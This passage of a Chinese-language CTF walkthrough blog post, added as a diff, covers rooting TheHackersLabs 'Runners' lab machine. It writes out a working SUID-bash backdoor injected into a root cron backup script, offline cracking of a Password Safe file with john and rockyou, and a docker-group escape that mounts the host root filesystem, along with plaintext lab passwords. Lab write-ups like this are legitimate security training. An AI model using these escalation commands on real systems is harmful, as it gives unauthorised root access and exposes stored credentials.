+            echo "$(date): Backup antiguo eliminado: $old_backup" >> /var/log/backup.log
+        done
+    fi
+}
+
+cleanup_backups
+```
+
+其实可以猜测这是一个定时任务的，可以使用pspy64进行分析，但是我这里省略了，直接给backup.sh最后面加上
+
+```bash
+cp /bin/bash /tmp/rootshell && chmod 4755 /tmp/rootshell
+```
+
+等了一小会儿，tmp下面出现了对应文件
+
+```bash
+maria@30acf6ca1fb6:~$ ls /tmp
+blog.sql  rootshell  tmp.rudLLA2neY
+maria@30acf6ca1fb6:~$ /tmp/rootshell -p
+rootshell-5.0# id
+uid=1001(maria) gid=1001(maria) euid=0(root) groups=1001(maria)
+```
+
+当前已经有root权限了
+
+```bash
+rootshell-5.0# ls /root
+TODO_LIST.txt
+rootshell-5.0# cat /root/TODO_LIST.txt
+1. Crear un script para automatizar los backups de la base de datos. (OK)
+2. Cifrar las contraseñas de la base de datos. (OK)
+3. Avisar a Ian para que cambie su contraseña, a ver si deja usar su famosa contraseña "iambatman" en todos lados. (Pendiente)
+```
+
+获取了一组新的用户凭证，接下来才是真的进入了靶机，而不是容器
+
+进来容器还不够，也就拿到个user.txt
+
+```bash
+ian@TheHackersLabs-Runners:~$ ls
+user.txt
+```
+
+然后关注到/home下还有用户elliot
+
+```bash
+ian@TheHackersLabs-Runners:/home/elliot$ ls -la
+total 36
+drwxr-xr-x 4 elliot elliot 4096 Nov 28  2024 .
+drwxr-xr-x 4 root   root   4096 Nov 28  2024 ..
+lrwxrwxrwx 1 root   root      9 Nov 28  2024 .bash_history -> /dev/null
+-rw-r--r-- 1 elliot elliot  220 Mar 31  2024 .bash_logout
+-rw-r--r-- 1 elliot elliot 3771 Mar 31  2024 .bashrc
+drwx------ 3 elliot elliot 4096 Nov 28  2024 .cache
+-rw------- 1 elliot elliot   20 Nov 27  2024 .lesshst
+-rw-r--r-- 1 elliot elliot  904 Nov 28  2024 miscredenciales.psafe3
+-rw-r--r-- 1 elliot elliot  807 Mar 31  2024 .profile
+drwx------ 2 elliot elliot 4096 Nov 27  2024 .ssh
+```
+
+我们可以发现，这里的miscredenciales.psafe3是可读的，问过ai，这是一种文件加密
+
+<img src="/assets/img/thehackerslabs-notes/image-20251124185829236.png" alt="image-20251124185829236" style="zoom:50%;" />
+
+可以使用psafe2john和john进行爆破
+
+```bash
+(base) yolo@yolo:~/Desktop/timu/test$ psafe2john miscredenciales.psafe3 > psafe.hash
+(base) yolo@yolo:~/Desktop/timu/test$ john --wordlist=/snap/seclists/rockyou.txt psafe.hash
+Using default input encoding: UTF-8
+Loaded 1 password hash (pwsafe, Password Safe [SHA256 256/256 AVX2 8x])
+Cost 1 (iteration count) is 2048 for all loaded hashes
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
+metallica        (miscredencial)
+1g 0:00:00:00 DONE (2025-11-24 18:54) 12.50g/s 51200p/s 51200c/s 51200C/s 123456..oooooo
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed
+```
+
+然后这组凭证是用来打开.psafe3文件的明文账密
+
+可以去GitHub仓库找到对应的工具https://github.com/pwsafe/pwsafe/releases/
+
+选中那个psafe3文件，然后输入metallica即可
+
+<img src="/assets/img/thehackerslabs-notes/image-20251124191154727.png" alt="image-20251124191154727" style="zoom:50%;" />
+
+第一个保存的密码就是elliot的系统密码：HwbE80ZOtZQdkYB
+
+登录进来后，看用户组，可以用docker组提权
+
+```bash
+elliot@TheHackersLabs-Runners:~$ id
+uid=1000(elliot) gid=1000(elliot) groups=1000(elliot),46(plugdev),110(docker)
+```
+
+```bash
+elliot@TheHackersLabs-Runners:~$ docker ps
+CONTAINER ID   IMAGE       COMMAND       CREATED         STATUS             PORTS                                                                      NAMES
+30acf6ca1fb6   root_blog   "/start.sh"   12 months ago   Up About an hour   0.0.0.0:80->80/tcp, :::80->80/tcp, 0.0.0.0:2222->22/tcp, :::2222->22/tcp   ubuntu_blog
+elliot@TheHackersLabs-Runners:~$ docker run -v /:/mnt --rm -it root_blog chroot /mnt sh
+# id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+`docker run -v /:/mnt --rm -it root_blog chroot /mnt sh`
+
+提权payload解析：
+
+- `-V /:/mnt` 挂载宿主机的根目录
+- `root_blog` 直接复用已经存在的docker镜像
+- `chroot /mnt` 切换根目录
+- `sh` 容器直接以sh命令启动，然后docker默认会以root用户执行
+
+---
+
+本篇完结
+
+<div align="center">
+<img src="/assets/img/0xgame2025teching.assets/20251013231159_034.webp" alt="完结撒花" style="width:50%;">
+</div>
